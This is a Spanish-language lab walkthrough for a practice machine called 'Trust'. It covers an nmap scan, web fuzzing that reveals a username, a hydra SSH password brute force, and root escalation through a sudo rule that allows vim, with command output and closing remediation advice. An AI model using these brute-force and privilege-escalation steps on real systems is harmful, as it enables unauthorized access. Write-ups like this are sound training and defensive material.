# SOLUCION-MAQUINA-TRUST
Esta maquina es resuelta haciendo un fuzzing web, realizando un ataque de fuerza bruta con un posible usuario , acceder a ella , y escalar privilegios gracias a que nuestro ususario(mario) en este caso, 
pueda ejecutar ciertos comandos con sudo debido a la configuracion del archivo "sudoers".

1. RECONOCIMIENTO
   ----------------
-Realizamos el escaneo a la maquina objetivo : 

    sudo  nmap -T5 -sVC 172.18.0.2
    
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-26 21:10 -04
    Nmap scan report for 172.18.0.2
    Host is up (0.000023s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
    | ssh-hostkey: 
    |   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
    |_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
    80/tcp open  http    Apache httpd 2.4.57 ((Debian))
    |_http-server-header: Apache/2.4.57 (Debian)
    |_http-title: Apache2 Debian Default Page: It works
    MAC Address: 02:42:AC:12:00:02 (Unknown)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds

como vectores de ataque , tenemos solo dos, el servicio (puerto 80) y el servicio 22(ssh)

  2.EXPLOTACION
  -----------
  al acceder a la pagina web, vemos que no tiene nada de interactividad, asi que descartamos algun de inyeccion o peticion mal configurada,
  por lo cual hacemos un fuzzing web y nos muestra el directorio "/secreto.php"., este nos muestra un mensaje "hola mario", el cual es un posible usuario.
  asi que probamos un ataque de fuerza bruta para probar.
  
    hydra 172.18.0.2 ssh -l mario -P rockyou.txt
    Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
    
    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-26 21:14:40
    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
    [DATA] attacking ssh://172.18.0.2:22/
    [22][ssh] host: 172.18.0.2   login: mario   password: chocolate
    1 of 1 target successfully completed, 1 valid password found
    [WARNING] Writing restore file because 3 final worker threads did not complete until end.
    [ERROR] 3 targets did not resolve or could not be connected
    [ERROR] 0 target did not complete
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-26 21:14:49

ya descubierto que nuestro posible usuario era ese , podemos conectarnos con el servicio por el puerto correspondiente (22)

    ssh  mario@172.18.0.2         
    mario@172.18.0.2's password: 
    Linux 554aedc87c62 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
conectado a la maquina:

    Last login: Sat Dec 27 01:04:32 2025 from 172.18.0.1
    mario@554aedc87c62:~$ whoami
    mario
nos damos cuenta que no somos el usuario root, asi que probamos que no se haya reutilizado la misma password:

    mario@554aedc87c62:~$ su root
    Password: 
    su: Authentication failure
con esto la password probada , tenemos que aplicar otras tecnicas para escalar privilegios.

3. #POST-EXPLOTACION(ESCALAR  PRIVILEGIOS)
   -----------------------------------------

como nombre al principio  de este repositorio, la tecnica que utilice para ser usuario root fue verificar si mi usuario ("mario" en este caso ), podria usar comandos especificos con sudo,lo probamos y ...


    [sudo] password for mario: 
    sudo: -: command not found
    mario@554aedc87c62:~$ sudo -l
    [sudo] password for mario: 
    Matching Defaults entries for mario on 554aedc87c62:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
    
    User mario may run the following commands on 554aedc87c62:
        (ALL) /usr/bin/vim
    mario@554aedc87c62:~$ sudo -u root /usr/bin/vim
    
    # whoami
    root

la hipotesis fue correcta, el archivo "sudoers" , tiene permitido que el usuario mario pudiese ejecutar un comando con sudo, lo que me hizo ser root

#RECOMENDACIONES
---------------
-Corregir el directorio expuesto
-poner una password mas seguro para el inicio de sesion por el servicio ssh  (ademas, actualizarlo a la 9.8)
- editar en la carpeta "sudoers", configurar para que los usuarios como mario tengan restringido ejecutar ciertos comandos de sudo 

      
